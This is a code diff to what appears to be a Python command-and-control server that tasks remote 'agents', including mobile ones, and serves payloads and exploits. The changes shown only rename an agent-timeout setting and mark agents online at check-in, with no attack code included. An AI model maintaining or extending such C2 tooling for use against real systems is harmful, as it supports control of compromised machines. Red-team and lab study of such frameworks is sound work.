@@ -154,7 +154,13 @@ MOBILE_AGENT_TOKEN = os.getenv("MOBILE_AGENT_TOKEN").encode('utf-8')
 DOWNLOAD_TOKEN = os.getenv("DOWNLOAD_TOKEN", "")  # token para download público de payloads
 TIMESTAMP_TOLERANCE = int(os.getenv("TIMESTAMP_TOLERANCE", "300"))  # segundos; aumente em lab com clock drift
 TASK_TIMEOUT_SECONDS = int(os.getenv("TASK_TIMEOUT_SECONDS", "300"))  # tasks 'in_progress' por mais de N segundos viram 'timeout'
-AGENT_OFFLINE_TIMEOUT = int(os.getenv("AGENT_OFFLINE_TIMEOUT", "300"))  # agente sem checkin por mais de N segundos vira 'offline'
+# AGENT_TIMEOUT_SECONDS é o nome canônico. AGENT_OFFLINE_TIMEOUT continua
+# aceito para preservar instalações existentes e passa a usar o mesmo valor.
+AGENT_TIMEOUT_SECONDS = max(1, int(os.getenv(
+    "AGENT_TIMEOUT_SECONDS",
+    os.getenv("AGENT_OFFLINE_TIMEOUT", "300"),
+)))
+AGENT_OFFLINE_TIMEOUT = AGENT_TIMEOUT_SECONDS
 # --- ESTRUTURAS DE DADOS E PERSISTÊNCIA ---
 OPERATOR_LOG_FILE = "c2_operator_log.txt"
 BASE_DIR      = Path(__file__).parent
@@ -165,7 +171,6 @@ PAYLOADS_DIR  = BASE_DIR / 'payloads'
 EXPLOITS_DIR = Path(__file__).parent / 'exploits'
 #agents = {}
 #tasks = {}
-AGENT_TIMEOUT_SECONDS = 60
 IPGEOLOCATION_API_KEY = os.getenv("IPGEOLOCATION_API_KEY")
 
 DASHBOARD_UPDATE_INTERVAL = 5  # Intervalo em segundos
@@ -2006,7 +2011,10 @@ def get_task(agent_id):
         err_json = json.dumps({"error": "Agente não registrado"})
         return app.response_class(encrypt_data(err_json, C2_AES_KEY), mimetype='text/plain'), 404
 
-    cursor.execute("UPDATE agents SET last_seen = ? WHERE id = ?", (datetime.now().isoformat(), agent_id))
+    cursor.execute(
+        "UPDATE agents SET last_seen = ?, status = 'online' WHERE id = ?",
+        (datetime.now().isoformat(), agent_id)
+    )
     conn.commit()
 
     try:
@@ -2700,7 +2708,10 @@ def get_task_mobile(agent_id):
         return jsonify({"error": "Agente não registrado"}), 404
 
     # Atualiza o last_seen para manter o agente online
-    cursor.execute("UPDATE agents SET last_seen = ? WHERE id = ?", (datetime.now().isoformat(), agent_id))
+    cursor.execute(
+        "UPDATE agents SET last_seen = ?, status = 'online' WHERE id = ?",
+        (datetime.now().isoformat(), agent_id)
+    )
     conn.commit()
     # A lógica de atualizar GEO pode ser mantida, mas vamos simplificar por agora
 
